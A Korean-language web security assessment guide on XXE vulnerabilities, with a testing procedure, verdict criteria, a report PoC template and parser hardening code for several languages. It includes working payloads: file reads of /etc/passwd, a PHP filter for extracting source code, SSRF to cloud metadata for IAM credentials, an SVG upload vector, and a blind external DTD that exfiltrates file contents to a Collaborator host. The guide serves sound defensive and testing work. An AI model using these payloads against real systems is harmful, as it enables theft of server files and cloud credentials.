---
sidebar_position: 14
title: XML 외부 엔티티 (XXE)
description: 웹 진단 - XML External Entity 점검 절차, In-band/Blind 페이로드, SVG 업로드 케이스, 보고서 양식
keywords: [XXE, XML External Entity, Blind XXE, OOB, SVG, defusedxml, OWASP A05]
draft: false
---

# XML 외부 엔티티 (XML External Entity, XXE)

> XML 파서가 외부 엔티티(External Entity)를 그대로 처리하여, 공격자가 **로컬 파일 읽기** 또는 **내부 SSRF**를 발생시키는 취약점.
> 클라우드 환경에서는 SSRF 경유로 IMDS 자격증명 탈취까지 이어질 수 있어 임팩트가 큼.

## 점검 개요

| 항목 | 내용 |
| :--- | :--- |
| **분류** | OWASP A05:2025 - Injection (2017의 A4 XXE → 2021부터 Security Misconfiguration → 2025 Injection으로 통합) / KISA 입력값 검증 |
| **CWE** | [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html) |
| **영향도** | 🔴 높음 (서버 파일 / 클라우드 자격증명 / 소스코드 노출) |
| **점검 난이도** | 하 (응답 노출형) / 상 (Blind + 외부 DTD 호스팅 필요) |
| **예상 점검 시간** | 30분 ~ 3시간 |

---

## 점검 목적

XML을 입력으로 받는 엔드포인트가 **DTD(Document Type Definition) 와 외부 엔티티 참조를 차단하지 않은 채** 파싱하는지 확인한다. 성공 시 **서버 로컬 파일(`/etc/passwd`, AWS credentials 파일, 어플리케이션 소스코드) 읽기**, **SSRF를 통한 내부망/클라우드 메타데이터 접근**이 가능하다.

---

## 유형 구분

| 유형 | 특징 | 판정 방법 |
| :--- | :--- | :--- |
| **In-band (응답 노출형)** | 엔티티 참조 결과가 응답 본문에 그대로 출력 | 응답에서 파일 내용 직접 확인 |
| **Blind (OOB)** | 응답에 노출 없음 — 외부 DTD + Burp Collaborator 필요 | DNS/HTTP 콜백으로 데이터 수신 |

> Error-based XXE(파일 내용을 일부러 잘못된 경로에 끼워넣어 에러 메시지로 노출) 는 모던 파서에서 잘 안 통하므로 In-band → Blind 순으로 시도. 옛날 시스템에서만 보조적으로 시도.

---

## 진단 절차

### Step 1. 진입점 식별

XML을 받는 엔드포인트를 후보로 잡는다. **Content-Type 헤더가 가장 빠른 단서**:

- `application/xml`, `text/xml`
- `application/soap+xml` — SOAP API
- **`image/svg+xml`** — SVG 업로드 (프로필 사진/아이콘에서 자주 발현)
- **DOCX/XLSX/PPTX 업로드** — 내부적으로 ZIP+XML, 파서가 외부 엔티티 처리 시 발현
- SAML 인증 응답
- RSS 피드 등록, OPML import

> **실무 팁**: JSON 엔드포인트도 시도해볼 가치가 있음. 동일 엔드포인트가 `Content-Type: application/xml` 으로 바꾸고 XML 본문을 보내면 그대로 파싱하는 경우가 있음.

### Step 2. DOCTYPE 주입 가능 여부 확인

먼저 **안전한 파일**로 외부 엔티티 참조가 동작하는지 확인 (운영 환경에서 `/etc/shadow` 같이 민감 파일 바로 시도 금지):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<root><name>&xxe;</name></root>
```

응답에 호스트명이 들어가면 → In-band 확정. 응답에 변화 없으면 → Blind 시도(Step 4).

### Step 3. In-band 데이터 추출

엔티티 참조 결과가 응답에 노출되는 위치를 찾고, 영향이 큰 파일로 추출 범위 확장.

### Step 4. Blind 판정 (OOB)

응답에 흔적이 없을 때, **외부 DTD를 가져가도록 유도**해서 Collaborator 콜백을 확인.

### Step 5. 영향 입증

단순 `/etc/hostname` 이 아니라 실질 위협 입증:
- `/etc/passwd` (Linux 일반)
- AWS 환경: `/proc/self/environ`, `~/.aws/credentials`, `/var/lib/cloud/data/instance-id`
- 어플리케이션 소스코드 (PHP wrapper로 base64 추출)
- SSRF 경유 IMDS 호출 (`http://169.254.169.254/...`) → SSRF 페이지 케이스 3 참조

---

## 페이로드 / 테스트 케이스

### 케이스 1: In-band 파일 읽기 (Linux/Windows)

**언제 쓰는지**: Step 2에서 In-band 가능성이 확인된 경우. 가장 자주 통하는 기본 페이로드.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

```xml
<!-- Windows 대상 -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<root><name>&xxe;</name></root>
```

**판정**: 응답 본문에 `root:x:0:0:...` (Linux) 또는 `[fonts]` (Windows) 같은 파일 내용이 포함되면 취약. 단순 500 에러는 파서가 DOCTYPE 자체를 거부하는 정상 동작일 수 있으므로, **에러 메시지 본문에 어떤 단어가 나오는지 확인**.

### 케이스 2: PHP wrapper로 소스코드 추출

**언제 쓰는지**: 대상이 PHP 환경(응답 헤더 `X-Powered-By: PHP`, `.php` 확장자)이고 In-band XXE가 가능할 때. 일반 텍스트 파일이 아닌 소스코드(주로 바이너리·따옴표 포함) 를 깨지지 않게 추출.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<root><name>&xxe;</name></root>
```

**판정**: 응답 본문에 base64 문자열이 출력되면 디코드해서 소스코드 확인. DB 접속 정보, API 키 등 자격증명이 노출되면 Critical 입증.

### 케이스 3: SSRF via XXE — 클라우드 IMDS 접근

**언제 쓰는지**: In-band가 가능하고 대상이 AWS/GCP/Azure 환경일 때. XXE 단일 결함만으로 IMDS 자격증명 탈취까지 입증 가능.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><name>&xxe;</name></root>
```

이후 응답에 노출된 Role 이름으로 한 번 더:

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>">
```

**판정**: 응답에 `AccessKeyId`, `SecretAccessKey`, `Token` JSON이 노출되면 Critical. SSRF 페이지의 PoC 양식과 동일하게 활용.

### 케이스 4: SVG 업로드를 통한 XXE

**언제 쓰는지**: 일반 XML 엔드포인트에서는 안 통하는데, 프로필 이미지/아이콘 업로드에서 SVG 가 허용되는 경우. 이미지 처리 라이브러리(ImageMagick 일부 버전, librsvg 등) 가 XML 파서를 거치면서 발현.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="50" font-size="14">&xxe;</text>
</svg>
```

**판정**: SVG 업로드 후 미리보기/렌더링된 결과 이미지 또는 변환된 PNG 안에 파일 내용이 텍스트로 그려져 보이면 취약. 텍스트가 안 보여도 메타데이터/EXIF에 들어갈 수 있으므로 결과 파일을 다양한 방식으로 검사.

### 케이스 5: Blind XXE — OOB 데이터 추출

**언제 쓰는지**: Step 2에서 응답에 변화는 없는데 외부 호출 가능성을 의심할 때. **외부 DTD 호스팅이 가능한 환경**(Burp Collaborator 또는 자체 웹서버) 이 필요.

**1) 1차 페이로드 (대상에 보냄):**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://<COLLAB>.oastify.com/evil.dtd">
  %xxe;
]>
<root><name>test</name></root>
```

**2) 외부 DTD (`evil.dtd` — 공격자 서버에서 제공):**

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<COLLAB>.oastify.com/?d=%file;'>">
%eval;
%exfil;
```

**판정**: Collaborator 패널에서 **2건의 콜백** 수신 — (1) `evil.dtd` 가져가는 요청, (2) `?d=<파일내용>` 형태의 데이터 송신 요청. 두 번째 요청의 query string에 파일 내용이 들어있으면 Blind XXE 입증 + 데이터 추출까지 입증.

> 파라미터 엔티티(`%`)가 단일 DTD 내부에서는 다른 엔티티 정의에 사용 불가하므로 **외부 DTD 분리**가 필수. 호스팅 가능한 외부 서버가 없으면 입증이 어려우므로, 사전에 Collaborator/interactsh 사용 가능 여부 확인.

### 그 외 — 짧게 언급만 (실무 비중 낮음)

- **Billion Laughs (XML Bomb)** — 중첩 엔티티로 메모리 폭증을 유발하는 DoS 페이로드. 진단 보고서에서는 별도 결함으로 다루지 않고 Defense-in-Depth 권고로 정리하는 경우가 많음.
- **`expect://` PHP RCE** — `expect.so` 확장이 설치된 환경 거의 없음. 발견 시 Critical이지만 우선순위 낮음.
- **DOCX/XLSX 직접 편집해서 XXE 삽입** — SVG 업로드(케이스 4) 가 더 빠르고 자주 통함. DOCX는 ZIP 해제→`word/document.xml` 수정→재압축 절차 필요.

---

## 취약 판정 기준

다음 중 **하나라도** 해당하면 취약:

- [ ] 외부 엔티티 페이로드 응답에 **로컬 파일 내용**(`/etc/passwd`, `win.ini` 등) 이 포함됨
- [ ] PHP wrapper로 어플리케이션 소스코드(base64) 가 응답에 노출됨
- [ ] SVG 업로드 후 변환 결과물에 파일 내용이 노출됨
- [ ] Blind 페이로드로 Burp Collaborator에 **외부 DTD 요청 + 데이터 추출 요청** 수신
- [ ] XXE 경유로 IMDS 등 내부/메타데이터 엔드포인트 호출 결과 노출

**오탐 주의 (다음은 XXE 아님 또는 별도 결함):**

- [ ] 단순 500 응답만 발생 (DOCTYPE 자체를 거부하는 정상 동작일 수 있음 — 에러 메시지 내용 확인)
- [ ] 외부 콜백만 가능하고 파일 읽기/내부 접근은 차단 (이미 부분 방어 적용 — 영향도 낮음으로 보고)

---

## PoC 양식 (보고서 붙여넣기용)

**[XXE - In-band 파일 읽기] - 재고 조회 API `/api/stock`**

1. `<TARGET>/api/stock` 엔드포인트가 `Content-Type: application/xml` 본문을 받는 것을 확인
2. 본문에 DOCTYPE + 외부 엔티티 참조 페이로드 삽입
3. 응답 본문에 `/etc/passwd` 내용 노출 확인

**요청 (Request):**

```http
POST /api/stock HTTP/1.1
Host: <TARGET>
Content-Type: application/xml
Cookie: SESSION=abcd1234

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

**응답 (Response) — 취약 발현 증거:**

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "error": "Invalid productId: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n...'"
}
```

**확인 사항:**
- 응답의 `error` 필드에 `/etc/passwd` 파일 내용이 그대로 노출됨
- 동일 패턴으로 `~/.aws/credentials`, 어플리케이션 설정 파일(DB 접속 정보 포함) 추출 가능
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/` 페이로드로 IAM Role 자격증명 추출 가능 (별첨 스크린샷)

---

## 영향도 분석

- **기밀성 (Confidentiality)**: 🔴 **높음** — 서버 로컬 파일(설정·자격증명·소스코드) 노출. 클라우드 환경에서는 IMDS 경유 IAM 자격증명 탈취까지 가능.
- **무결성 (Integrity)**: 🟡 — 일반적으로 파일 쓰기는 불가. 단, 탈취한 자격증명으로 다른 시스템 변조 가능.
- **가용성 (Availability)**: 🟡 — Billion Laughs 같은 DoS 페이로드는 가능하나 진단 보고서에서는 별도 다루는 경우 적음.
- **추가 위협**:
  - **클라우드 계정 단위 침해** — IMDS → IAM 자격증명 → AWS API 호출
  - **소스코드 유출 → 2차 공격** — 어플리케이션 로직/하드코딩 자격증명 분석으로 추가 침투

**비즈니스 임팩트:**
서버 파일 노출만으로도 DB 접속 정보·API 키·내부 시스템 정보가 유출되어 추가 침해의 기반이 된다. 클라우드 환경의 XXE는 SSRF와 결합되어 단일 결함으로 **계정 단위 침해**가 가능하므로 Critical로 분류.

---

## 대응방안

### 개발자 관점 (필수)

XXE 방어의 정답은 거의 하나로 수렴: **DTD 처리와 외부 엔티티 참조를 파서 단에서 비활성화**. 입력 필터링이나 화이트리스트보다 이 한 줄 설정이 훨씬 확실함.

**Java (DocumentBuilderFactory):**

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

**Python — `defusedxml` 사용 (표준 라이브러리는 안전하지 않음):**

```python
# 위험 — 표준 xml.etree.ElementTree 는 외부 엔티티 처리
import xml.etree.ElementTree as ET
tree = ET.fromstring(user_xml)

# 안전 — defusedxml 사용
from defusedxml import ElementTree as ET
tree = ET.fromstring(user_xml)   # 외부 엔티티 자동 차단
```

**PHP:**

```php
// PHP 8.0+ 는 기본적으로 libxml 외부 엔티티 차단됨
// 8.0 미만이면 명시적으로:
libxml_disable_entity_loader(true);

// SimpleXML / DOMDocument 사용 시
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NONET | LIBXML_NOENT);   // LIBXML_NONET: 외부 네트워크 차단
```

**.NET:**

```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);
```

**Node.js (libxmljs / xml2js):**

```javascript
// xml2js 는 기본적으로 외부 엔티티 미처리 (안전)
// libxmljs 사용 시 noent 옵션 끄기:
const doc = libxmljs.parseXml(xml, { noent: false, dtdload: false });
```

### 운영자 관점

1. **출구 트래픽 제어** — 어플리케이션 서버에서 외부로 나가는 HTTP/DNS 트래픽을 화이트리스트화. 외부 DTD fetch 와 OOB 콜백 모두 차단.
2. **WAF 룰 적용** — `<!DOCTYPE`, `<!ENTITY`, `SYSTEM` 키워드 패턴 탐지 (보조 수단).
3. **메타데이터 엔드포인트 보호** — AWS IMDSv2 강제 (SSRF 페이지 대응방안과 동일).

### 안전 / 위험 코드 비교

```python
# 위험 — 표준 라이브러리 직접 사용
import xml.etree.ElementTree as ET
root = ET.fromstring(request.data)

# 위험 — lxml 기본 설정 (resolve_entities=True 가 기본)
from lxml import etree
parser = etree.XMLParser()
root = etree.fromstring(request.data, parser)

# 안전 — defusedxml
from defusedxml import ElementTree as ET
root = ET.fromstring(request.data)

# 안전 — lxml 명시적 설정
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False)
root = etree.fromstring(request.data, parser)
```

---

## 참고자료

- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger - XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)
- [PayloadsAllTheThings - XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- [defusedxml (Python)](https://github.com/tiran/defusedxml)
- [HackTricks - XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
